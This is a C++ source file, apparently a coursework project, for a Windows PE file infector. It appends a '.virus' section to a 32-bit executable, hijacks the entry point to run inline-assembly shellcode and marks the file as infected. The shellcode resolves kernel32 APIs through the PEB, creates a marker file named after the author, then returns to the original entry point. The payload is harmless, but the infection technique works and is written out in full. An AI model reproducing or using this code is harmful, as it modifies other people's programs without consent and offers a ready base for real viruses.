/*
 * PE infector
 * Author: Zhao Yuqi
 * Time: 2022.5.7, 19:47
 */

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>

#define INFECT_FLAG_1 0xDEAD
#define INFECT_FLAG_2 0xBEEF
#define INFECT_SEC_NAME ".virus"

using namespace std;


class Parser {
public:
    explicit Parser(BYTE *fData) {
        fileData = fData;
    }

    PIMAGE_DOS_HEADER getDOSHeader() {
        auto dos = (PIMAGE_DOS_HEADER) fileData;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            return nullptr;
        }
        return dos;
    }

    PIMAGE_NT_HEADERS getNTHeader() {
        auto dos = getDOSHeader();
        if (dos == nullptr) {
            return nullptr;
        }
        auto nt = (PIMAGE_NT_HEADERS) (dos->e_lfanew + (SIZE_T) fileData);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            return nullptr;
        }
        return nt;
    }

    PIMAGE_FILE_HEADER getFileHeader() {
        auto nt = getNTHeader();
        if (nt == nullptr) {
            return nullptr;
        }
        auto header = &(nt->FileHeader);
        return header;
    }

    PIMAGE_OPTIONAL_HEADER getOptHeader() {
        auto nt = getNTHeader();
        if (nt == nullptr) {
            return nullptr;
        }
        auto header = &(nt->OptionalHeader);
        return header;
    }

    PIMAGE_SECTION_HEADER getNewSectionLoc() {
        auto numOfSec = getFileHeader()->NumberOfSections;
        if (numOfSec == 0) {
            return nullptr;
        }

        auto firstSec = IMAGE_FIRST_SECTION(getNTHeader());
        // the last section is 1stSec + numOfSec - 1, so here returns the new location
        auto sec = firstSec + numOfSec;

        // if ((sec->Characteristics != 0) || (sec->Name[0] != 0) || (sec->SizeOfRawData != 0)) {
        //     return nullptr;
        // }
        return sec;
    }

    static SIZE_T secAlign(SIZE_T size, SIZE_T align) {
        // align in this way
        return (size % align == 0) ? size : (size / align + 1) * align;
    }

private:
    BYTE *fileData;
};


class Modifier {
public:
    explicit Modifier(LPCSTR fName) {
        fileName = fName;
        if (!createHandleAndMap(fName)) {
            cout << "[ERROR]Initialize failed." << endl;
            exit(-1);
        }
    }

    BOOL createHandleAndMap(LPCSTR fName) {
        // create file handle
        hFile = CreateFile(fName,
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ,
                           nullptr,
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            cout << "[OpenError]Open file failed." << endl;
            return FALSE;
        }

        fSize = GetFileSize(hFile, nullptr);
        cout << "File size: " << fSize << endl;

        // create file handle mapping
        hMap = CreateFileMapping(hFile,
                                 nullptr,
                                 PAGE_READWRITE | SEC_COMMIT,
                                 0,
                                 0,
                                 nullptr);
        if (hMap == nullptr) {
            cout << "[MappingError]Mapping failed." << endl;
            CloseHandle(hFile);
            return FALSE;
        }

        // create map view
        pvFile = MapViewOfFile(hMap,
                               FILE_MAP_READ | FILE_MAP_WRITE,
                               0,
                               0,
                               0);
        if (pvFile == nullptr) {
            cout << "[MappingError]Pointer mapping failed." << endl;
            CloseHandle(hMap);
            CloseHandle(hFile);
            return FALSE;
        }

        cout << "[SUCCESS]Handling success." << endl;
        fStart = (BYTE *) pvFile;

        // initialize the parser
        parser = new Parser(fStart);
        if (parser->getFileHeader() == nullptr) {
            cout << "[ParseError]Failed to parse the PE file." << endl;
            closeAllHandles();
            return FALSE;
        }

        // check if the file type is x86 (i386)
        if (parser->getFileHeader()->Machine != IMAGE_FILE_MACHINE_I386) {
            cout << "[OnlySupportX86Error]Infector only supports x86 programs." << endl;
            closeAllHandles();
            return FALSE;
        }

        cout << endl << "#----File Info----#" << endl;
        cout << "File name: " << fileName << endl;
        cout << "NT header bias: " << (SIZE_T) parser->getNTHeader() - (SIZE_T) fStart << endl;
        cout << "File header bias: " << (SIZE_T) parser->getFileHeader() - (SIZE_T) fStart << endl;
        cout << "Optional header bias: " << (SIZE_T) parser->getOptHeader() - (SIZE_T) fStart << endl;
        cout << "#-------End-------#" << endl << endl;

        return TRUE;
    }

    BOOL addNewSector() {
        if (parser == nullptr) {
            return FALSE;
        }

        // if infected, return
        if (isInfected()) {
            cout << "[INFECTED]The target is already infected." << endl;
            return FALSE;
        }

        // save the new section header and find location
        auto newSec = new IMAGE_SECTION_HEADER;
        auto newSecLoc = parser->getNewSectionLoc();

        if (newSecLoc == nullptr) {
            return FALSE;
        }

        // get the alignment and old entry point
        auto secAli = parser->getOptHeader()->SectionAlignment;
        auto fileAli = parser->getOptHeader()->FileAlignment;
        auto oldEntryPt = parser->getOptHeader()->AddressOfEntryPoint;

        // save start point and end point of SHELLCODE into these two vars
        // when complied, what they pointed (__asm block) will become the Machine Code
        // so we can use these two positions to get the SHELLCODE content
        DWORD start, end;
        if (!newSectorContent(oldEntryPt, start, end)) {
            return FALSE;
        }

        // size of SHELLCODE and old entry point
        DWORD newSecSize = end - start + sizeof(DWORD);

        // fix the new section header
        // every members' concept can be easily recognized by those names
        // some members have to align
        strncpy((char *) newSec->Name, INFECT_SEC_NAME, 7);
        newSec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
        newSec->PointerToRawData = (newSecLoc - 1)->PointerToRawData + (newSecLoc - 1)->SizeOfRawData;
        newSec->SizeOfRawData = Parser::secAlign(newSecSize, fileAli);
        newSec->Misc.VirtualSize = newSecSize;
        newSec->VirtualAddress = (newSecLoc - 1)->VirtualAddress +
                                 Parser::secAlign((newSecLoc - 1)->SizeOfRawData, secAli);

        cout << endl << ">>>New section info:<<<" << endl;
        cout << "Characteristics: 0x" << hex << newSec->Characteristics << endl;
        cout << "Pointer to raw: 0x" << hex << newSec->PointerToRawData << endl;
        cout << "Size of raw: 0x" << hex << newSec->SizeOfRawData << endl;
        cout << "Virtual size: 0x" << hex << newSec->Misc.VirtualSize << endl;
        cout << "Virtual address: 0x" << hex << newSec->VirtualAddress << endl;
        cout << ">>>End<<<" << endl << endl;

        // copy the new section head into the new section location
        CopyMemory(newSecLoc, newSec, sizeof(IMAGE_SECTION_HEADER));

        // fix the head info
        // every members' concept can be easily recognized by those names
        // some members have to align
        parser->getFileHeader()->NumberOfSections++;
        parser->getOptHeader()->SizeOfImage += newSec->SizeOfRawData;
        parser->getOptHeader()->SizeOfCode += Parser::secAlign(newSecSize, secAli);
        parser->getOptHeader()->AddressOfEntryPoint = newSec->VirtualAddress + sizeof(DWORD);

        // write-in the infect flag
        // I use the reserve WORD 'e_res2' to write
        parser->getDOSHeader()->e_res2[0] = INFECT_FLAG_1;
        parser->getDOSHeader()->e_res2[1] = INFECT_FLAG_2;

        // backup the data after the new section
        DWORD bakPt = newSec->PointerToRawData;
        auto endPt = SetFilePointer(hFile, 0, nullptr, FILE_END);
        auto bakSize = endPt - bakPt;
        auto backup = new BYTE[bakSize];

        // copy the backup data to 'backup' array
        CopyMemory(backup, bakPt + fStart, bakSize);

        // get the new section content, then copy them to new array
        auto newSecData = new BYTE[newSec->SizeOfRawData];
        ZeroMemory(newSecData, newSec->SizeOfRawData);
        CopyMemory(newSecData, &oldEntryPt, sizeof(DWORD));
        CopyMemory(newSecData + sizeof(DWORD), (BYTE *)start, end - start);

        // write-in the new section data, then write-in the backup data
        // firstly need to set the file-pointer to backup-pointer
        DWORD dNum = 0;
        SetFilePointer(hFile, (long)bakPt, nullptr, FILE_BEGIN);
        WriteFile(hFile, newSecData, newSec->SizeOfRawData, &dNum, nullptr);
        WriteFile(hFile, backup, bakSize, &dNum, nullptr);

        // flush buffer and close handles
        FlushFileBuffers(hFile);
        delete[] newSecData;
        delete[] backup;
        closeAllHandles();

        cout << "[SUCCESS]Infected successfully." << endl;
        return TRUE;
    }

    BOOL newSectorContent(DWORD oep, DWORD &start, DWORD &end) {
        if (parser == nullptr) {
            return FALSE;
        }

        // new segment pointer, pointing the SHELLCODE
        DWORD codeStart, codeEnd;
        DWORD oldEntry = oep;           // old entry address, will be written in base - 4

        // I write the SHELLCODE here
        // they will be written in the PE file
        // when complied, they will turn to the Machine Code
        // so I don't need to write the Machine Code again
        // just directly use the 'start' and 'end' pointer
        __asm {
            pushad

            mov eax, inner
            mov codeStart, eax          ; save the start to var 'codeStart'

            mov eax, outer
            mov codeEnd, eax            ; save the end to var 'codeEnd'

            jmp outer                   ; directly go to the end of SHELLCODE

            inner:
            call fun

            fun:
            ; find addr of kernel base
            mov eax, fs:[30h]           ; PEB
            mov eax, [eax + 0ch]        ; loader data
            mov eax, [eax + 1ch]        ; 1st initialization order list
            mov eax, [eax]              ; 2nd ...
            mov eax, [eax + 08h]        ; kernel base addr
            push eax                    ; save the addr

            mov edi, eax
            mov eax, [edi + 3ch]
            mov edx, [edi + eax + 78h]
            add edx, edi                ; edx stores the base addr of export dir
            mov ecx, [edx + 18h]        ; ecx stores the num of export dir
            mov ebx, [edx + 20h]
            add ebx, edi                ; ebx stores the addr of dir names

            ; find addr of func 'GetProcAddress'
            finder:                     ; Here find 'GetProcAddress' then get other addrs
            dec ecx
            mov esi, [ebx + ecx * 4]
            add esi, edi
            mov eax, 'PteG'             ; compare 'GetP'
            cmp [esi], eax
            jne finder
            mov eax, 'Acor'             ; compare 'rocA'
            cmp [esi + 4], eax
            jne finder                  ; Only this func begins with 'GetProcA', so that is all.

            mov ebx, [edx + 24h]
            add ebx, edi
            mov cx, [ebx + ecx * 2]     ; calculate the rank
            mov ebx, [edx + 1ch]
            add ebx, edi                ; base addr of export funcs
            mov eax, [ebx + ecx * 4]
            add eax, edi                ; use rank to get the addr
            push eax                    ; save 'GetProcAddress' addr

            ; find addr of func 'LoadLibraryExA'
            mov ebx, esp                ; save stack
            push 00004178h
            push 'Eyra'
            push 'rbiL'
            push 'daoL'
            push esp                    ; proc name: 'LoadLibraryExA'
            push [ebx + 4]              ; dll base: kernel base
            call [ebx]                  ; Call 'GetProcAddress'
            mov esp, ebx
            push eax                    ; save the addr

            ; load the lib 'Kernel32.dll'
            mov ebx, esp
            push 0
            push 'lld.'
            push '23le'
            push 'nreK'
            mov edx, esp                ; save string
            push 10h                    ; dwFlags: LOAD_IGNORE_CODE_AUTHZ_LEVEL
            push 0                      ; hFile: NULL
            push edx                    ; lpLibFileName: 'Kernel32.dll'
            call [ebx]                  ; Call 'LoadLibraryExA'
            mov esp, ebx
            push eax                    ; save the addr

            ; find addr of func 'CreateFileA'
            mov ebx, esp
            push 0041656ch
            push 'iFet'
            push 'aerC'
            push esp                    ; find 'CreateFileA'
            push [ebx]                  ; use lib we just loaded
            call [ebx + 8]
            mov esp, ebx
            push eax                    ; save the addr

            ; create the file
            mov ebx, esp
            push 00007478h
            push 't.iq'
            push 'uyoa'
            push 'hz-5'
            push '8008'
            push '1203'
            push '9102'
            mov edx, esp                ; My own infomation
            push 0                      ; NULL
            push 80h                    ; flags: FILE_ATTRIBUTE_NORMAL
            push 2h                     ; how to open: CREATE_ALWAYS
            push 0                      ; NULL
            push 0                      ; share: NULL
            push 40000000h              ; access mode: GENERIC_WRITE
            push edx                    ; file name
            call [ebx]                  ; call 'CreateFileA'
            mov esp, ebx
                                        ; Now the Stack looks like this, we need to restore it with 'pop':
            pop eax                     ; [esp]:        addr of func 'CreateFileA'
            pop eax                     ; [esp + 4]:    addr of loaded dll addr
            pop eax                     ; [esp + 8]:    addr of func 'LoadLibraryExA'
            pop eax                     ; [esp + 12]:   addr of func 'GetProcAddress'
            pop eax                     ; [esp + 16]:   addr of base dll addr
                                        ; above all poped, return address left in the stack
            pop edi                     ; get the return address
            sub edi, 5                  ; sub the bias of 'call' command ('call' 1 byte, address 4 bytes)

            push eax
            mov eax, fs:[30h]
            mov eax, dword ptr [eax + 8]
            add eax, [edi - 4]          ; get the old entry
            mov edi, eax
            pop eax
            jmp edi                     ; jumped back

            outer:
            popad
            nop
        }

        cout << "Code start: 0x" << hex << codeStart << endl;
        cout << "Code end: 0x" << hex << codeEnd << endl;
        cout << "Code length: 0x" << hex << codeEnd - codeStart << endl;

        start = codeStart;
        end = codeEnd;
        return TRUE;
    }

    BOOL isInfected() {
        if (parser == nullptr) {
            return FALSE;
        }

        // if infect flag is written-in, return true
        if (parser->getDOSHeader()->e_res2[0] == INFECT_FLAG_1 &&
            parser->getDOSHeader()->e_res2[1] == INFECT_FLAG_2) {
            return TRUE;
        }

        return FALSE;
    }

    void closeAllHandles() {
        UnmapViewOfFile(pvFile);
        CloseHandle(hMap);
        CloseHandle(hFile);
    }

private:
    LPCSTR fileName;
    HANDLE hFile = nullptr, hMap = nullptr;
    DWORD fSize = 0;
    PVOID pvFile = nullptr;
    BYTE *fStart = nullptr;
    Parser *parser = nullptr;
};


int main(int argc, char **argv) {
    const char *fileName;

    // if command params exist, infect that
    // or infect the default
    fileName = argc == 1 ? "Notepad2.exe" : argv[1];

    auto modifier = Modifier(fileName);
    return modifier.addNewSector() ? 0 : 1;
}
